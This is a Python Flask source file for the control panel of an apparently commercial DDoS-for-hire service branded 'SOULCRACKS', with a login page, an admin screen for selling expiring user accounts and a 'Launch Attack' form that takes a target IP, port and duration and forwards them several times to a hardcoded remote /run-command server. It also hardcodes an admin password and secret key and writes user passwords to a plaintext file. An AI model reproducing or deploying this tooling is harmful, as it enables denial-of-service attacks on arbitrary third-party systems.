import logging
import requests
import time
import os
from flask import Flask, request, render_template_string, redirect, url_for, session
from werkzeug.security import generate_password_hash, check_password_hash

app = Flask(__name__)
app.secret_key = 'supersecretkey'  

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

NGROK_URL_1 = "http://77.37.45.104:8000/run-command"
NGROK_URL_2 = "http://77.37.45.104:8000/run-command"
NGROK_HEADERS = {"ngrok-skip-browser-warning": "any_value"}
LOCAL_URL_1 = "http://77.37.45.104:8000/run-command"
LOCAL_URL_2 = "http://77.37.45.104:8000/run-command"
NEW_LOCAL_URL = "http://77.37.45.104:8000/run-command"  

users = {
    'SOULCRACKS': {
        'password': generate_password_hash('SOULCRACKS'),
        'registration_time': time.time(),
        'expiration_time': None
    }
}

login_html = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>
    <style>
        body {
            background-color: black;
            color: white;
            font-family: Arial, sans-serif;
            text-align: center;
        }
        .container {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        form {
            border: 2px solid white;
            padding: 20px;
            border-radius: 10px;
            background-color: rgba(255, 255, 255, 0.1);
        }
        input[type="text"],
        input[type="password"] {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border-radius: 5px;
            border: 1px solid white;
            background-color: rgba(255, 255, 255, 0.1);
            color: white;
        }
        input[type="submit"] {
            width: 100%;
            padding: 10px;
            margin-top: 10px;
            border-radius: 5px;
            border: none;
            background-color: rgb(0, 255, 255);
            color: black;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div class="container">
        <form action="/login" method="post">
            <label for="username">Username:</label><br>
            <input type="text" id="username" name="username"><br>
            <label for="password">Password:</label><br>
            <input type="password" id="password" name="password"><br>
            <input type="submit" value="Login">
        </form>
        {% if not session.get('logged_in') %}
            <a href="/register">Register</a>
        {% endif %}
    </div>
</body>
</html>
"""

register_html = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Register</title>
    <style>
        body {
            background-color: black;
            color: white;
            font-family: Arial, sans-serif;
            text-align: center;
        }
        .container {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        form {
            border: 2px solid white;
            padding: 20px;
            border-radius: 10px;
            background-color: rgba(255, 255, 255, 0.1);
        }
        input[type="text"],
        input[type="password"] {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border-radius: 5px;
            border: 1px solid white;
            background-color: rgba(255, 255, 255, 0.1);
            color: white;
        }
        input[type="submit"] {
            width: 100%;
            padding: 10px;
            margin-top: 10px;
            border-radius: 5px;
            border: none;
            background-color: rgb(0, 255, 255);
            color: black;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div class="container">
        <form action="/register" method="post">
            <label for="register_option">Select Option:</label><br>
            <select id="register_option" name="register_option">
                <option value="register_new_user">Register New User</option>
                <option value="no_register">Do Not Register</option>
            </select><br>
            <label for="username">Username:</label><br>
            <input type="text" id="username" name="username"><br>
            <label for="password">Password:</label><br>
            <input type="password" id="password" name="password"><br>
            <label for="expiration">Account Expiry Time:</label><br>
            <select id="expiration" name="expiration">
                <option value="1">1 Day</option>
                <option value="3">3 Days</option>
                <option value="7">7 Days</option>
                <option value="30">30 Days</option>
                <option value="60">60 Days</option>
            </select><br>
            <input type="submit" value="Submit">
        </form>
    </div>
</body>
</html>
"""

home_html = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Attack Form</title>
    <style>
        body {
            background-color: black;
            color: white;
            font-family: Arial, sans-serif;
            text-align: center;
        }
        .container {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            flex-direction: column;
        }
        form {
            border: 2px solid white;
            padding: 20px;
            border-radius: 10px;
            background-color: rgba(255, 255, 255, 0.1);
            margin-bottom: 20px;
        }
        input[type="text"],
        input[type="number"] {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border-radius: 5px;
            border: 1px solid white;
            background-color: rgba(255, 255, 255, 0.1);
            color: white;
        }
        input[type="submit"] {
            width: 100%;
            padding: 10px;
            margin-top: 10px;
            border-radius: 5px;
            border: none;
            background-color: rgb(0, 255, 255);
            color: black;
            cursor: pointer;
        }
        a {
            display: inline-block;
            margin-top: 20px;
            padding: 10px 20px;
            border-radius: 5px;
            background-color: rgb(0, 255, 255);
            color: black;
            text-decoration: none;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div class="container">
        {% if attack_started %}
            <div style="background-color: rgba(0, 0, 0, 0.5); padding: 20px; border-radius: 10px; margin-bottom: 20px;">
                Attack Started On IP: {{ ip }}, Port: {{ port }}, Time: {{ time }}
            </div>
        {% endif %}
        <form action="/attacks" method="post">
            <label for="ip">IP Address:</label><br>
            <input type="text" id="ip" name="ip"><br>
            <label for="port">Port:</label><br>
            <input type="number" id="port" name="port"><br>
            <label for="duration">Attack Duration (in seconds):</label><br>
            <input type="number" id="duration" name="duration"><br>
            <input type="submit" value="Launch Attack">
        </form>
        <a href="https://t.me/SOULCRACKS">Join our Telegram Channel</a>
        {% if session.get('username') == 'SOULCRACKS' %}
            <a href="/register">Register New User</a>
        {% endif %}
    </div>
</body>
</html>
"""

@app.route('/')
def home():
    return redirect(url_for('login'))

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        if username in users and check_password_hash(users[username]['password'], password):
            session['logged_in'] = True
            session['username'] = username
            return redirect(url_for('attacks'))
        else:
            return "Invalid credentials. Please try again."
    return render_template_string(login_html)

@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        if 'register_option' in request.form:
            register_option = request.form['register_option']
            if register_option == 'register_new_user':
                username = request.form['username']
                password = request.form['password']
                expiration_days = int(request.form['expiration'])

                if username in users:
                    return "Username already exists. Please choose a different username."

                expiration_time = time.time() + expiration_days * 24 * 60 * 60

                users[username] = {
                    'password': generate_password_hash(password),
                    'registration_time': time.time(),
                    'expiration_time': expiration_time
                }

                # Write username and password to a text file
                write_to_file(username, password)

                return redirect(url_for('login'))
            elif register_option == 'no_register':
                return "You chose not to register a new user."
            else:
                return "Invalid option."
    return render_template_string(register_html)

def write_to_file(username, password):
    with open('user_credentials.txt', 'a') as file:
        file.write(f"Username: {username}, Password: {password}\n")

@app.route('/attacks', methods=['GET', 'POST'])
def attacks():
    if 'logged_in' in session and session['logged_in']:
        if request.method == 'POST':
            try:
                target_ip = request.form['ip']
                target_port = request.form['port']
                attack_duration = request.form['duration']

                ngrok_response_1 = run_attack_command(NGROK_URL_1, NGROK_HEADERS, target_ip, target_port, attack_duration)
                logging.info(f"Ngrok Attack response 1: {ngrok_response_1}")

                ngrok_response_2 = run_attack_command(NGROK_URL_2, NGROK_HEADERS, target_ip, target_port, attack_duration)
                logging.info(f"Ngrok Attack response 2: {ngrok_response_2}")

                local_response_1 = run_attack_command(LOCAL_URL_1, {}, target_ip, target_port, attack_duration)
                logging.info(f"Local Attack response 1: {local_response_1}")

                local_response_2 = run_attack_command(LOCAL_URL_2, {}, target_ip, target_port, attack_duration)
                logging.info(f"Local Attack response 2: {local_response_2}")

                new_local_response = run_attack_command(NEW_LOCAL_URL, {}, target_ip, target_port, attack_duration)
                logging.info(f"New Local Attack response: {new_local_response}")

                # Set up variables for displaying the attack details
                attack_started = True
                attack_time = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
                
                return render_template_string(home_html, attack_started=attack_started, ip=target_ip, port=target_port, time=attack_time)
            except Exception as e:
                logging.error(f"Error in /attacks endpoint: {e}")
                return "Error in processing attack command."
        return render_template_string(home_html)
    else:
        return redirect(url_for('login'))


def run_attack_command(url, headers, target_ip, target_port, attack_duration):  # Updated function signature
    try:
        params = {"ip": target_ip, "port": target_port, "duration": attack_duration}  # Updated parameters
        response = requests.get(url, headers=headers, params=params)
        return response.json()
    except Exception as e:
        logging.error(f"Error in run_attack_command: {e}")
        return {"error": str(e)}

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8000)
